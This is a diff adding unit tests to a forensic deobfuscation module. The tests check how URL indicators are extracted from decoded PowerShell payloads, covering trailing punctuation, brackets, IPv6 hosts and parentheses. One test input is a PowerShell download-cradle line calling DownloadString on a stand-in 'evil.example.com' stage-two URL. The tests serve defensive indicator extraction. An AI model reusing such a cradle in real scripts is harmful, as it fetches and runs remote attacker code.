@@ -222,3 +222,59 @@ describe("applyDeobfuscation", () => {
     expect(next.forensicTimeline[2].deobfuscated).toBeDefined();
   });
 });
+
+// ── The URL scraper's trailing-punctuation rule, shared with the importers. This module kept a
+// fourth private copy of the strip, so a decoded payload naming a URL that ends in a dot produced a
+// different indicator here than the same URL read by an importer.
+describe("deobfuscateText — URL punctuation", () => {
+  const urls = (payload: string): string[] => {
+    const r = deobfuscateText(psEncCmdline(payload));
+    expect(r).not.toBeNull();
+    return r!.rawIocs.filter((i) => i.type === "url").map((i) => i.value);
+  };
+
+  it("keeps trailing punctuation that a closing quote proves is part of the URL", () => {
+    expect(urls("(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.')")).toContain(
+      "http://evil.example.com/stage2.",
+    );
+  });
+
+  it("still strips sentence punctuation from a bare URL", () => {
+    const v = urls("Write-Host the payload came from http://evil.example.com/stage2.");
+    expect(v).toContain("http://evil.example.com/stage2");
+    expect(v).not.toContain("http://evil.example.com/stage2.");
+  });
+
+  // URL_RE here does not exclude "]", unlike the importers' patterns, so a bracket really can land
+  // at the end of a match. The shared class strips it; the private copy did not.
+  it("strips a trailing bracket the match actually swallowed", () => {
+    expect(urls("Write-Host see [http://evil.example.com/stage2]")).toContain(
+      "http://evil.example.com/stage2",
+    );
+  });
+
+  // A "]" is only prose when the match does not open it. In an IPv6 authority the bracket is
+  // REQUIRED syntax — dropping it emits a URL that cannot be resolved or pivoted on.
+  it("keeps the closing bracket of a bare IPv6 authority", () => {
+    expect(urls("Write-Host $c = http://[2001:db8::1]")).toContain("http://[2001:db8::1]");
+  });
+
+  it("keeps an IPv6 authority that carries a port and path", () => {
+    expect(urls("Write-Host $c = http://[2001:db8::1]:8080/stage2")).toContain(
+      "http://[2001:db8::1]:8080/stage2",
+    );
+  });
+
+  // Balanced parentheses are part of the path, not the sentence.
+  it("keeps balanced parentheses inside the path", () => {
+    expect(urls("Write-Host $c = http://evil.example.com/a(foo)")).toContain(
+      "http://evil.example.com/a(foo)",
+    );
+  });
+
+  it("still strips an unbalanced closing parenthesis the sentence added", () => {
+    const v = urls("Write-Host (grab it from http://evil.example.com/stage2)");
+    expect(v).toContain("http://evil.example.com/stage2");
+    expect(v).not.toContain("http://evil.example.com/stage2)");
+  });
+});
